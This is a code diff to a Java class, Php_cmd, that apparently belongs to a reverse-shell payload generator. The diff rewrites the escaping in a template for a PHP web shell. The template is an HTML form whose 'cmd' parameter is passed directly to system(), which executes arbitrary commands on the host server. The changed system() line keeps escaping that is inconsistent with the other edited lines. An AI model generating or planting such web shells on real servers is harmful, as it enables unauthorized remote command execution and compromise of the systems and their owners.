@@ -8,23 +8,23 @@ public class Php_cmd extends Reverse {
 
     public Php_cmd(String localIP, int localPort, LISTENER listener, SHELLS shellType){
         super(localIP, localPort, listener, shellType);
-        shellFormat = String.format("<html>\\n" + //
-                "<body>\\n" + //
-                "<form method=\\\"GET\\\" name=\\\"<?php echo basename($_SERVER[\\'PHP_SELF\\']); ?>\\\">\\n" + //
-                "<input type=\\\"TEXT\\\" name=\\\"cmd\\\" id=\\\"cmd\\\" size=\\\"80\\\">\\n" + //
-                "<input type=\\\"SUBMIT\\\" value=\\\"Execute\\\">\\n" + //
-                "<\\/form>\\n" + //
-                "<pre>\\n" + //
-                "<?php\\n" + //
-                "    if(isset($_GET[\\'cmd\\']))\\n" + //
-                "    {\\n" + //
-                "        system($_GET[\\'cmd\\']);\\n" + //
-                "    }\\n" + //
-                "?>\\n" + //
-                "<\\/pre>\\n" + //
-                "<\\/body>\\n" + //
-                "<script>document.getElementById(\\\"cmd\\\").focus();<\\/script>\\n" + //
-                "<\\/html>");
+        shellFormat = String.format("<html>\n" + //
+                "<body>\n" + //
+                "<form method=\"GET\" name=\"<?php echo basename($_SERVER[\'PHP_SELF\']); ?>\">\n" + //
+                "<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n" + //
+                "<input type=\"SUBMIT\" value=\"Execute\">\n" + //
+                "</form>\n" + //
+                "<pre>\n" + //
+                "<?php\n" + //
+                "    if(isset($_GET[\'cmd\']))\n" + //
+                "    {\n" + //
+                "        system($_GET[\\'cmd\\']);\n" + //
+                "    }\n" + //
+                "?>\n" + //
+                "</pre>\n" + //
+                "</body>\n" + //
+                "<script>document.getElementById(\"cmd\").focus();</script>\n" + //
+                "</html>");
     }
 
     @Override
